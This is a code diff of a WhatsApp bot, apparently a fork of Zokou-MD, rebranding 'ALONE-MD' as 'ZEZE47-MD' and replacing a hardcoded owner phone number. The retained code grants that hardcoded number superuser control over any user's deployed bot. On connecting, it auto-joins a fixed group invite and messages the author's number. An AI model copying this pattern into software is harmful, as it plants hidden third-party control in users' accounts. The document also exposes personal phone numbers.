@@ -47,7 +47,7 @@ const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/ALONE-MD;;;=>/g,"");
+var session = conf.session.replace(/ZEZE47-MD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 
 
@@ -80,7 +80,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['ALONE-MD', "safari", "1.0.0"],
+            browser: ['ZEZE47-MD', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -154,10 +154,10 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255673750170';
-            const dj2 = '255673750170';
-            const dj3 = "255673750170";
-            const luffy = '255673750170';
+            const dj = '255682937675';
+            const dj2 = '255682937675';
+            const dj3 = "255682937675";
+            const luffy = '255682937675';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -165,7 +165,7 @@ setTimeout(() => {
             
             var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\t [][]...{ALONE Md}...[][]");
+            console.log("\t [][]...{ZEZE47 Md}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message from : " + nomGroupe);
@@ -442,7 +442,7 @@ function mybotpic() {
 
                                       if (action === 'remove') {
 
-                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by ALONE-MD .`;
+                                        txt += `message deleted \n @${auteurMessage.split("@")[0]} removed from group by ZEZE47-MD .`;
 
                                     await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                                     (0, baileys_1.delay)(800);
@@ -526,7 +526,7 @@ function mybotpic() {
            // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
             const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
             var sticker = new Sticker(gifLink, {
-                pack: 'Alone-Md',
+                pack: 'ZEZE47-Md',
                 author: conf.OWNER_NAME,
                 type: StickerTypes.FULL,
                 categories: ['🤩', '🎉'],
@@ -684,7 +684,7 @@ zk.ev.on('group-participants.update', async (group) => {
 ╚════◇◇◇═════╝
 ◇ *Descriptioon*   ◇
 
-${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
+${metadata.desc}\n\n> POWERED BY 𝘡𝘌𝘡𝘌47 𝘛𝘌𝘊𝘏.`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -812,24 +812,24 @@ ${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ ALONE-MD connecting in your account...");
+                console.log("ℹ️ ZEZE47-MD connecting in your account...");
             }
             else if (connection === 'open') {
                 await zk.groupAcceptInvite("DizrXzN1o1k0HsrWay5hvX");
-                console.log("✅ ALONE-MD connected successfully☺️");
+                console.log("✅ ZEZE47-MD connected successfully☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("ALONE-MD by TOPUTECH installing cmds😇\n\n");
+                console.log("ZEZE47-MD by 𝘡𝘌𝘡𝘌47 𝘛𝘌𝘊𝘏 installing cmds😇\n\n");
                 //chargement des commandes 
                 console.log("chargement des commandes ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
                             require(__dirname + "/commandes/" + fichier);
-                            console.log(fichier + "Successfully installed ALONE-MD commands✔️");
+                            console.log(fichier + "Successfully installed ZEZE47-MD commands✔️");
                         }
                         catch (e) {
                             console.log(`${fichier} n'a pas pu être chargé pour les raisons suivantes : ${e}`);
@@ -849,20 +849,20 @@ ${metadata.desc}\n\n> POWERED BY TOPU TECH.`;
                 else {
                     md = "undefined";
                 }
-                console.log("Alone-MD successfully connected✅");
+                console.log("Zeze-MD successfully connected✅");
 
                 await activateCrons();
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
-                let cmsg = `ALONE-MD  RUNNING ...
+                let cmsg = `ZEZE47-MD  ONLINE...
     
     Prefix : [ ${prefixe} ]
     Mode :${md} mode
     Total Command : ${evt.cm.length}
-    Owner : TOPU TECH 🦸  
+    Owner : 𝘡𝘌𝘡𝘌47 𝘛𝘌𝘊𝘏 🦸  
 
 > ❣️ *Im here laways 4r you* ❣️\n`;
-                await zk.sendMessage("255673750170@s.whatsapp.net", { text: cmsg });
+                await zk.sendMessage("255682937675@s.whatsapp.net", { text: cmsg });
                 }
             }
             else if (connection == "close") {
